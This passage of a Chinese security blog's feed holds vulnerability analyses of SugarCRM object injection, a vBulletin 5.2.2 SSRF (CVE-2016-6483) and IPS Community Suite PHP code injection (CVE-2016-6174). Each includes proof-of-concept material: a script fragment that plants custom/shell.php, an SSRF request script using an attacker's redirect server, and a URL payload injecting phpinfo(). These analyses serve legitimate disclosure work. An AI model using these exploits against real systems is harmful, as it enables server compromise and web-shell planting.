class="line">req.post(url, data=data)</span><br></pre></td></tr></table></figure><p>shell在<code>custom/shell.php</code></p><p>恩，就是这样了。</p><h1 id="0x03-补丁diff"><a href="#0x03-补丁diff" class="headerlink" title="0x03 补丁diff"></a>0x03 补丁diff</h1><p>在v6.5.24中，对<code>sugar_unserialize</code>进行了如下改进：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sugar_unserialize</span><span class="params">($value)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    preg_match(<span class="string">'/[oc]:[^:]*\d+:/i'</span>, $value, $matches);</span><br><span class="line">    <span class="keyword">if</span> (count($matches)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> unserialize($value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过了前面的分析，可以看到对象类型的序列化参数无法禁止反序列化了。</p><h1 id="0x04-修复方案"><a href="#0x04-修复方案" class="headerlink" title="0x04 修复方案"></a>0x04 修复方案</h1><p>升级SugarCRM到最新版本</p><p>对于php版本的升级并不是很建议，因为在一些高版本的php上，环境搭建可能会出现问题。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;免费广告…..推荐使用&lt;code&gt;PHPSTORM+Xdebug&lt;/code&gt;来分析漏洞，下面的过程都是利用&lt;code&gt;PHPSTORM&lt;/code&gt;来分析的。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="PHP" scheme="https://lucifaer.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2016-6483 vBulletin 5.2.2 SSRF漏洞</title>
    <link href="https://lucifaer.com/2016/08/11/CVE-2016-6483%20vBulletin%205.2.2%20SSRF%E6%BC%8F%E6%B4%9E/"/>
    <id>https://lucifaer.com/2016/08/11/CVE-2016-6483 vBulletin 5.2.2 SSRF漏洞/</id>
    <published>2016-08-11T10:28:00.000Z</published>
    <updated>2018-08-09T02:22:01.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-漏洞概述："><a href="#0x00-漏洞概述：" class="headerlink" title="0x00 漏洞概述："></a>0x00 漏洞概述：</h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>vBulletin是一个商业论坛程序，它封装了自己的curl用于发出请求。近日研究人员发现在某些版本中其getlinkdata这项功能并没有对跳转进行检测和制止，从而导致SSRF漏洞的产生。</p><a id="more"></a><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>vBulletin  &lt;= 5.2.2      Preauth Server Side Request Forgery (SSRF)</p><p>vBulletin  &lt;= 4.2.3</p><p>vBulletin  &lt;= 3.8.9</p><h1 id="0x01-漏洞分析："><a href="#0x01-漏洞分析：" class="headerlink" title="0x01 漏洞分析："></a>0x01 漏洞分析：</h1><p>首先，在<code>/upload/include/vb5/frontend/controller/link.php</code>中定义了<code>actionGetlinkdata</code>函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  $input = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'url'</span> =&gt; trim($_REQUEST[<span class="string">'url'</span>]),</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$api = Api_InterfaceAbstract::instance();</span><br><span class="line"></span><br><span class="line">$video = $api-&gt;callApi(<span class="string">'content_video'</span>, <span class="string">'getVideoFromUrl'</span>, <span class="keyword">array</span>($input[<span class="string">'url'</span>]));</span><br><span class="line">$data = $api-&gt;callApi(<span class="string">'content_link'</span>, <span class="string">'parsePage'</span>, <span class="keyword">array</span>($input[<span class="string">'url'</span>]));</span><br></pre></td></tr></table></figure><p>获取输入的url参数，通过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$video = $api-&gt;callApi(<span class="string">'content_video'</span>, <span class="string">'getVideoFromUrl'</span>, <span class="keyword">array</span>($input[<span class="string">'url'</span>]));</span><br><span class="line">$data = $api-&gt;callApi(<span class="string">'content_link'</span>, <span class="string">'parsePage'</span>, <span class="keyword">array</span>($input[<span class="string">'url'</span>]));</span><br></pre></td></tr></table></figure><p>分别传递给<code>content_video</code>和<code>content_link</code>这两个controller中的<code>getVideoFromUrl</code>和<code>parsePage</code>这两个api函数。</p><p>在<code>/upload/core/vb/api/content/link.php</code>中的<code>parsePage</code>api函数中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parsePage</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// Validate url</span></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'|^http(s)?://[a-z0-9-]+(\.[a-z0-9-]+)*(:[0-9]+)?(/.*)?$|i'</span>, $url))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> vB_Exception_Api(<span class="string">'upload_invalid_url'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (($urlparts = vB_String::parseUrl($url)) === <span class="keyword">false</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> vB_Exception_Api(<span class="string">'upload_invalid_url'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Try to fetch the url</span></span><br><span class="line">$vurl = <span class="keyword">new</span> vB_vURL();</span><br><span class="line">$vurl-&gt;set_option(VURL_URL, $url);</span><br><span class="line"><span class="comment">// Use IE8's User-Agent for the best compatibility</span></span><br><span class="line">$vurl-&gt;set_option(VURL_USERAGENT, <span class="string">'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)'</span>);</span><br><span class="line">$vurl-&gt;set_option(VURL_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">$vurl-&gt;set_option(VURL_CLOSECONNECTION, <span class="number">1</span>);</span><br><span class="line">$vurl-&gt;set_option(VURL_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">$vurl-&gt;set_option(VURL_HEADER, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">$page = $vurl-&gt;exec();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;extractData($page, $urlparts);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>完成对于url的获取,以及对于各个参数的设置。</li><li>传入的<code>$url</code>直接新建了一个对象<code>vB_vURL()</code>来实现<code>curl</code></li><li><code>$vurl-&gt;set_option(VURL_FOLLOWLOCATION, 1);</code>设置<code>VURL_FOLLOWLOCATION</code>参数值为1，允许跳转后的二次跳转</li></ul><p>在<code>/upload/core/vb/vurl.php</code>中的<code>class_vB_vURL()</code>触发漏洞：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> $classnames = <span class="keyword">array</span>(<span class="string">'cURL'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;options = vB::getDatastore()-&gt;get_value(<span class="string">'options'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// create the objects we need</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;classnames <span class="keyword">AS</span> $classname)</span><br><span class="line">&#123;</span><br><span class="line">$fullclass = <span class="string">'vB_vURL_'</span> . $classname;</span><br><span class="line"><span class="keyword">$this</span>-&gt;transports[<span class="string">"$classname"</span>] = <span class="keyword">new</span> $fullclass(<span class="keyword">$this</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;reset();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">  $result = <span class="keyword">$this</span>-&gt;exec2();</span><br><span class="line">  ......</span><br><span class="line">  <span class="keyword">return</span> $result;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">exec2</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        .......</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (array_keys(<span class="keyword">$this</span>-&gt;transports) <span class="keyword">AS</span> $tname)</span><br><span class="line">    &#123;</span><br><span class="line">    $transport =&amp; <span class="keyword">$this</span>-&gt;transports[$tname];</span><br><span class="line">    <span class="keyword">if</span> (($result = $transport-&gt;exec()) === VURL_HANDLED  <span class="keyword">AND</span> !<span class="keyword">$this</span>-&gt;fetch_error())</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;format_response(<span class="keyword">array</span>(<span class="string">'headers'</span> =&gt; $transport-&gt;response_header, <span class="string">'body'</span> =&gt; (<span class="keyword">isset</span>($transport-&gt;response_text)? $transport-&gt;response_text : <span class="string">""</span>), <span class="string">'body_file'</span> =&gt; <span class="keyword">$this</span>-&gt;tmpfile));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>首先，在调用该类时触发构造函数，创建我们需要的行的对象，处理拼接后的对象为：<code>vB_vURL_cURL()</code></li><li>之后，使用其中的<code>exec()</code>方法。</li></ul><p>在<code>/upload/core/vb/vurl/curl.php</code>中看到<code>vB_vURL_cURL()</code>类中的<code>exec()</code>方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  $urlinfo = @vB_String::parseUrl(<span class="keyword">$this</span>-&gt;vurl-&gt;options[VURL_URL]);</span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;validateUrl($urlinfo))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> VURL_NEXT;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ......</span><br><span class="line"></span><br><span class="line">  $url = <span class="keyword">$this</span>-&gt;vurl-&gt;options[VURL_URL];</span><br><span class="line"></span><br><span class="line">  $redirectCodes = <span class="keyword">array</span>(<span class="number">301</span>, <span class="number">302</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ($i = $redirect_tries; $i &gt; <span class="number">0</span>; $i--)</span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">$result = <span class="keyword">$this</span>-&gt;execCurl($url, $isHttps);</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">$this</span>-&gt;vurl-&gt;bitoptions &amp; VURL_FOLLOWLOCATION) &amp;&amp; in_array(curl_getinfo(<span class="keyword">$this</span>-&gt;ch, CURLINFO_HTTP_CODE), $redirectCodes))</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;closeTempFile();</span><br><span class="line">  <span class="keyword">return</span> VURL_NEXT;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>vB_vURL_cURL()</code>类中的<code>validateUrl()</code>方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">validateUrl</span><span class="params">($urlinfo)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="comment">// VBV-11823, only allow http/https schemes</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($urlinfo[<span class="string">'scheme'</span>]) <span class="keyword">OR</span> !in_array(strtolower($urlinfo[<span class="string">'scheme'</span>]), <span class="keyword">array</span>(<span class="string">'http'</span>, <span class="string">'https'</span>)))</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// VBV-11823, do not allow localhost and 127.0.0.0/8 range by default</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($urlinfo[<span class="string">'host'</span>]) <span class="keyword">OR</span> preg_match(<span class="string">'#localhost|127\.(\d)+\.(\d)+\.(\d)+#i'</span>, $urlinfo[<span class="string">'host'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    $allowedPorts = <span class="keyword">isset</span>($config[<span class="string">'Misc'</span>][<span class="string">'uploadallowedports'</span>]) ? $config[<span class="string">'Misc'</span>][<span class="string">'uploadallowedports'</span>] : <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">if</span> (!is_array($allowedPorts))</span><br><span class="line">    &#123;</span><br><span class="line">    $allowedPorts = <span class="keyword">array</span>(<span class="number">80</span>, <span class="number">443</span>, $allowedPorts);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    $allowedPorts = array_merge(<span class="keyword">array</span>(<span class="number">80</span>, <span class="number">443</span>), $allowedPorts);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!in_array($urlinfo[<span class="string">'port'</span>], $allowedPorts))</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li><p>首先看到<code>validateUrl()</code>进行了对于<code>$urlinfo</code>数组的过滤：</p><ul><li>不允许<code>127.0.0.0/8</code>这一系列的地址对本地地址或端口的操作，用于防止<code>ssrf</code>攻击</li><li>限制跳转地址访问的端口只能是<code>443</code>和<code>80</code>端口。</li></ul></li><li><p>之后，在<code>exec()</code>中，当我们设置的<code>VURL_FOLLOWLOCATION</code>值为1时，会将跳转信息为<code>301</code>与<code>302</code>的信息设置为允许二次跳转，触发<code>ssrf</code>漏洞。</p></li></ul><h1 id="0x02-漏洞利用："><a href="#0x02-漏洞利用：" class="headerlink" title="0x02 漏洞利用："></a>0x02 漏洞利用：</h1><p>测试poc：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"></span><br><span class="line">u = <span class="string">'vb服务器ip地址'</span></span><br><span class="line">redirect_server = <span class="string">'你的vps'</span></span><br><span class="line">vul_url = u + <span class="string">'/link/getlinkdata'</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'url'</span> : redirect_server</span><br><span class="line">&#125;</span><br><span class="line">r = req.get(vul_url)</span><br><span class="line"><span class="keyword">print</span> vul_url</span><br><span class="line"><span class="keyword">print</span> r</span><br><span class="line">req.post(vul_url, data=data)</span><br></pre></td></tr></table></figure><h1 id="0x03-漏洞修复："><a href="#0x03-漏洞修复：" class="headerlink" title="0x03 漏洞修复："></a>0x03 漏洞修复：</h1><ul><li>将vBulletin升级到最新版本</li></ul><h1 id="0x05-参考："><a href="#0x05-参考：" class="headerlink" title="0x05 参考："></a>0x05 参考：</h1><p><a href="http://legalhackers.com/advisories/vBulletin-SSRF-Vulnerability-Exploit.txt" target="_blank" rel="noopener">http://legalhackers.com/advisories/vBulletin-SSRF-Vulnerability-Exploit.txt</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-漏洞概述：&quot;&gt;&lt;a href=&quot;#0x00-漏洞概述：&quot; class=&quot;headerlink&quot; title=&quot;0x00 漏洞概述：&quot;&gt;&lt;/a&gt;0x00 漏洞概述：&lt;/h1&gt;&lt;h2 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h2&gt;&lt;p&gt;vBulletin是一个商业论坛程序，它封装了自己的curl用于发出请求。近日研究人员发现在某些版本中其getlinkdata这项功能并没有对跳转进行检测和制止，从而导致SSRF漏洞的产生。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="PHP" scheme="https://lucifaer.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>IPS Community Suite 自动加载的PHP代码注入漏洞（CVE-2016-6174）</title>
    <link href="https://lucifaer.com/2016/08/09/IPS%20Community%20Suite%20%E8%87%AA%E5%8A%A8%E5%8A%A0%E8%BD%BD%E7%9A%84PHP%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-6174%EF%BC%89/"/>
    <id>https://lucifaer.com/2016/08/09/IPS Community Suite 自动加载的PHP代码注入漏洞（CVE-2016-6174）/</id>
    <published>2016-08-09T01:12:00.000Z</published>
    <updated>2018-08-09T02:22:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近刚报的一个IPS的漏洞，个人感觉使用性并不是很强，但是审计过程却是很有趣的，拿来分享一下。</p><a id="more"></a><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><h3 id="1-漏洞信息"><a href="#1-漏洞信息" class="headerlink" title="1.漏洞信息"></a>1.漏洞信息</h3><p>“IPS Community Suite “是一款国外比较常见的cms。但在其4.1.12.3版本及以下版本，存在PHP代码注入漏洞，该漏洞源于程序未能充分过滤content_class请求参数。远程攻击者可利用该漏洞注入并执行任意PHP代码。</p><h3 id="2-漏洞触发条件："><a href="#2-漏洞触发条件：" class="headerlink" title="2. 漏洞触发条件："></a>2. 漏洞触发条件：</h3><hr><p>IPS版本：&lt;=4.1.12.3</p><p>php环境：&lt;=5.4.24和5.5.0-5.5.8</p><h3 id="3-漏洞复现效果图："><a href="#3-漏洞复现效果图：" class="headerlink" title="3. 漏洞复现效果图："></a>3. 漏洞复现效果图：</h3><hr><p><img src="http://blog.knownsec.com/wp-content/uploads/2016/08/phpinfo.png" alt="phpinfo.png"></p><h3 id="4-漏洞原理图："><a href="#4-漏洞原理图：" class="headerlink" title="4. 漏洞原理图："></a>4. 漏洞原理图：</h3><hr><p><img src="http://blog.knownsec.com/wp-content/uploads/2016/08/ips.png" alt="IPS7.png"></p><h3 id="5-检测poc"><a href="#5-检测poc" class="headerlink" title="5. 检测poc"></a>5. 检测poc</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`http:<span class="comment">//[host]/[ips]/index.php?app=core&amp;module=system&amp;controller=content&amp;do=find&amp;content_class=cms\Fields1&#123;&#125;phpinfo();/*`</span></span><br></pre></td></tr></table></figure><h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><p>首先，在cms的入口<code>index.php</code>中的<code>IPS\Controller\Front::i()</code><br>在调用run方法运行程序时:</p><p><code>IPS\Controller\Front</code></p><p>会作为自动加载类先被<code>init.php</code>中的<code>autoloader()</code>方法所重定向并包含。</p><p>在该过程中会首先包含<code>IPS\Request</code>(<code>/system/Request/Request.php</code>),参数在这里被接收：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">IPS\Request Object (</span><br><span class="line"> [_url:<span class="keyword">protected</span>] =&gt; IPS\Http\Url Object (</span><br><span class="line">   [url:<span class="keyword">protected</span>]</span><br><span class="line">   =&gt; http:<span class="comment">//localhost/IPS/index.php?app=core&amp;module=system&amp;controller=content&amp;do=find&amp;content_class=cms\Fields1&#123;&#125;phpinfo();/*</span></span><br><span class="line">   [data] =&gt; <span class="keyword">Array</span> (</span><br><span class="line">     [scheme] =&gt; http</span><br><span class="line">     [host] =&gt; localhost</span><br><span class="line">     [path] =&gt; /IPS/index.php</span><br><span class="line">     [query] =&gt; app=core&amp;module=system&amp;controller=content&amp;<span class="keyword">do</span>=find&amp;content_class=cms\Fields1&#123;&#125;phpinfo();<span class="comment">/*</span></span><br><span class="line"><span class="comment">     )</span></span><br><span class="line"><span class="comment">     [queryString] =&gt; Array (</span></span><br><span class="line"><span class="comment">       [app] =&gt; core</span></span><br><span class="line"><span class="comment">       [module] =&gt; system</span></span><br><span class="line"><span class="comment">       [controller] =&gt; content</span></span><br><span class="line"><span class="comment">       [do] =&gt; find</span></span><br><span class="line"><span class="comment">       [content_class] =&gt; cms\Fields1&#123;&#125;phpinfo();/* )</span></span><br><span class="line"><span class="comment">       [isInternal] =&gt; 1</span></span><br><span class="line"><span class="comment">       [isFriendly] =&gt;</span></span><br><span class="line"><span class="comment">     )</span></span><br><span class="line"><span class="comment">     [data:protected] =&gt; Array (</span></span><br><span class="line"><span class="comment">       [app] =&gt; core</span></span><br><span class="line"><span class="comment">       [module] =&gt; system</span></span><br><span class="line"><span class="comment">       [controller] =&gt; content</span></span><br><span class="line"><span class="comment">       [do] =&gt; find</span></span><br><span class="line"><span class="comment">       [content_class] =&gt; cms\Fields1&#123;&#125;phpinfo();/*</span></span><br><span class="line"><span class="comment">     )</span></span><br><span class="line"><span class="comment"> )</span></span><br></pre></td></tr></table></figure><p>可以明显的看到url被<code>Request</code>对象中的<code>data</code>数组以键值得形式所接收并存储。</p><p>之后会包含<code>IPS\Dispatcher\Standard</code>，在这个类中，有以下定义：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;classname = <span class="string">'IPS\\'</span> . <span class="keyword">$this</span>-&gt;application-&gt;directory . <span class="string">'\\modules\\'</span> . <span class="keyword">$this</span>-&gt;controllerLocation . <span class="string">'\\'</span> . <span class="keyword">$this</span>-&gt;module-&gt;key . <span class="string">'\\'</span> . <span class="keyword">$this</span>-&gt;controller;</span><br></pre></td></tr></table></figure><p>会将之前接收的参数拼接成<code>$classname</code>(<code>$classname=IPS\core\modules\front\system</code>)。</p><p>包含执行完毕后在<code>IPS\Dispatcher</code>中调用方法<code>run()</code>方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/* Init class */</span></span><br><span class="line">  <span class="keyword">if</span>( !class_exists( <span class="keyword">$this</span>-&gt;classname ) )</span><br><span class="line">  &#123;</span><br><span class="line">    \IPS\Output::i()-&gt;error( <span class="string">'page_doesnt_exist'</span>, <span class="string">'2S100/1'</span>, <span class="number">404</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;dispatcherController = <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;classname;</span><br><span class="line">  <span class="keyword">if</span>( !( <span class="keyword">$this</span>-&gt;dispatcherController <span class="keyword">instanceof</span> \IPS\Dispatcher\Controller ) )</span><br><span class="line">  &#123;</span><br><span class="line">    \IPS\Output::i()-&gt;error( <span class="string">'page_not_found'</span>, <span class="string">'5S100/3'</span>, <span class="number">500</span>, <span class="string">''</span> );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Execute */</span></span><br><span class="line">  <span class="keyword">$this</span>-&gt;dispatcherController-&gt;execute();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">$this</span>-&gt;finish();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到现在的<code>$this-&gt;dispatcherController=IPS\core\modules\front\system</code>。<br>之后判断<code>IPS\core\modules\front\system</code>是否为<code>\IPS\Dispatcher\Controller</code>的子类。</p><p>在<code>/applications/core/modules/front/system/content.php</code>找到<code>IPS\core\modules\front\system</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 